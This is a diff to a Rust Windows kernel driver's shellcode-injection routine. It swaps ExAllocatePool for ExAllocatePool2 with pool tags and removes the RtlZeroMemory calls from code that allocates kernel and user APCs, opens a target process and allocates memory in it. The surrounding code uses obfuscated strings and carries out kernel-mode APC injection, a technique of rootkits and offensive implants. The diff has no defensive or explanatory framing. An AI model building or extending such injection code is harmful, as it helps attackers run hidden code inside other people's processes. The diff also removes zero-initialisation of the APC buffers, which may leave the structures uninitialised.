@@ -2,7 +2,6 @@
 
 use {
     obfstr::obfstr, 
-    winapi::um::winnt::RtlZeroMemory,
     shared::structs::TargetInjection,
     core::{ffi::c_void, ptr::null_mut, mem::{size_of, transmute}}, 
     crate::{
@@ -16,10 +15,10 @@ use {
     }, 
     wdk_sys::{
         ntddk::{
-            ExAllocatePool, IoGetCurrentProcess, ZwAllocateVirtualMemory, 
+            ExAllocatePool2, IoGetCurrentProcess, ZwAllocateVirtualMemory, 
             ZwClose, ZwOpenProcess, ExFreePool, PsIsThreadTerminating
         },
-        _MODE::{KernelMode, UserMode}, _POOL_TYPE::NonPagedPool , *
+        _MODE::{KernelMode, UserMode}, *
     }, 
 };
 
@@ -180,21 +179,17 @@ impl InjectionShellcode {
             &mut result_number,
         );
 
-        let user_apc = ExAllocatePool(NonPagedPool, size_of::<KAPC>() as u64) as *mut KAPC;
+        let user_apc = ExAllocatePool2(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, u32::from_be_bytes(*b"krts")) as *mut KAPC;
         if user_apc.is_null() {
-            log::error!("ExAllocatePool Failed");
+            log::error!("ExAllocatePool2 (User) Failed");
             return STATUS_UNSUCCESSFUL;
         }
 
-        RtlZeroMemory(user_apc as *mut _, size_of::<KAPC>() as usize);
-
-        let kernel_apc = ExAllocatePool(NonPagedPool, size_of::<KAPC>() as u64) as *mut KAPC;
+        let kernel_apc = ExAllocatePool2(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, u32::from_be_bytes(*b"urds")) as *mut KAPC;
         if kernel_apc.is_null() {
-            log::error!("ExAllocatePool Failed");
+            log::error!("ExAllocatePool2 (Kernel) Failed");
             return STATUS_UNSUCCESSFUL;
         }
-        
-        RtlZeroMemory(kernel_apc as *mut _, size_of::<KAPC>() as usize);
 
         KeInitializeApc(
             kernel_apc, 
